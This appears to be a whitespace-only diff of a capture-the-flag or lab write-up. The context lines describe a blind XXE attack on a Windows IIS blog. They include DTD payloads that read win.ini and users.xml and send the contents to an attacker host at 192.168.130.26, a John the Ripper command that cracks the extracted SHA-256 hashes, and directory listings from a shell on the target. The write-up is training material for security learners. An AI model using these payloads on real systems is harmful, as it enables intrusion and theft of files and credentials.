@@ -87,7 +87,7 @@ kali@kali:cat oob.xml
 <foo>&e1;</foo>
 ```
 ```bash
-kali@kali:cat exfil.dtd                                                                                                                                            
+kali@kali:cat exfil.dtd
 <!ENTITY % p1 SYSTEM "file:///C:/WINDOWS/win.ini">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.130.26/EX?%p1;'>">
 %p2;
@@ -120,7 +120,7 @@ Serving HTTP on 0.0.0.0 port 445 (http://0.0.0.0:445/) ...
 That was successful, now we can exfiltrate the users.xml file, we found earlier.
 
 ```bash
-kali@kali:cat exfil.dtd                                                                                                                                            
+kali@kali:cat exfil.dtd
 <!ENTITY % p1 SYSTEM "file:///C:/inetpub/wwwroot/blog/App_Data/users.xml">
 <!ENTITY % p2 "<!ENTITY e1 SYSTEM 'http://192.168.130.26:445/EX?%p1;'>">
 %p2;
@@ -179,7 +179,7 @@ kali@kali:echo "hJg8Y.....XBhuw=" | base64 -d | xxd -p -c 32
 Now, we can crack the hash using John the Ripper.
 
 ```bash
-kalI@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256                                                                                
+kalI@kali:john hash --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
 Using default input encoding: UTF-8
 Loaded 2 password hashes with no different salts (Raw-SHA256 [SHA256 128/128 SSE2 4x])
 Warning: poor OpenMP scalability for this hash type, consider --fork=4
@@ -328,15 +328,15 @@ c:\windows\system32\inetsrv>
 We have no flag, but we find a username, who might have the password we found earlier.
 
 ```bash
-C:\Users>dir                                                                                                                                                 
+C:\Users>dir
 Volume in drive C has no label.
- Volume Serial Number is A8A4-C362                                                                                                                           
+ Volume Serial Number is A8A4-C362
  Directory of C:\Users
 8/21/2023  08:36 AM    <DIR>          .
 08/21/2023  08:36 AM    <DIR>          ..
 08/09/2023  05:28 PM    <DIR>          .NET v2.0
-08/09/2023  05:28 PM    <DIR>          .NET v2.0 Classic                                                                                                     
-08/09/2023  05:28 PM    <DIR>          .NET v4.5                                                                                                             
+08/09/2023  05:28 PM    <DIR>          .NET v2.0 Classic
+08/09/2023  05:28 PM    <DIR>          .NET v4.5
 08/09/2023  05:28 PM    <DIR>          .NET v4.5 Classic
 03/12/2026  05:26 AM    <DIR>          Administrator
 08/09/2023  05:28 PM    <DIR>          Classic .NET AppPool
